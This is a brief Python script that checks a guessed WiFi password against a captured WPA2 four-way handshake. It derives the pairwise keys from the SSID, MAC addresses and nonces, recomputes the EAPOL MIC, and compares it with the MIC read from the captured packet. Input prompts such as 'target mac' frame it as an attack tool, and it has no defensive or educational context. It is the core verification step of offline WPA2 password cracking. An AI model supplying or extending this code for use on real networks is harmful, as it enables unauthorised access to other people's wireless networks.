import hashlib
import hmac

def calculate_wpa2_mic(password, ssid, ap_mac, client_mac, ap_nonce, client_nonce, eapol_data):
    ssid_bytes = ssid.encode('utf-8')
    password_bytes = password.encode('utf-8')

    pmk = hashlib.pbkdf2_hmac('sha1', password_bytes, ssid_bytes, 4096, 32)
    #orders them
    min_mac, max_mac = min(ap_mac, client_mac), max(ap_mac, client_mac)
    min_nonce, max_nonce = min(ap_nonce, client_nonce), max(ap_nonce, client_nonce)

    b_data = b"Pairwise key expansion\x00" + min_mac + max_mac + min_nonce + max_nonce

    kck = hmac.new(pmk, b_data + b"\x00", hashlib.sha1).digest()[:16]
    calculated_mic = hmac.new(kck, eapol_data, hashlib.sha1).digest()[:16]

    return calculated_mic


###
name_of_wifi = input("WiFi Name: ")
password_to_test = input("WiFi Password: ")

router_mac = input("router mac").replace(":","").lower()
client_mac = input("target mac").replace(":","").lower()

anonce = input("anonce")
nonce = input("nonce")

second_packet = input("second packet")



ap_mac_bytes = bytes.fromhex(router_mac)
client_mac_bytes = bytes.fromhex(client_mac)

ap_nonce_bytes = bytes.fromhex(nonce)
client_nonce_bytes = bytes.fromhex(anonce)

captured_mic = bytes.fromhex(second_packet[162:194])

packet_with_zero_mic = second_packet[:162] + ("0" * 32) + second_packet[194:]
eapol_packet_data = bytes.fromhex(packet_with_zero_mic)
#
result_mic = calculate_wpa2_mic(
    password_to_test, name_of_wifi, ap_mac_bytes,
    client_mac_bytes, ap_nonce_bytes, client_nonce_bytes, eapol_packet_data
)
#
if result_mic == captured_mic:
    print(f"Password is: {password_to_test}")
else:
    print("Failed")
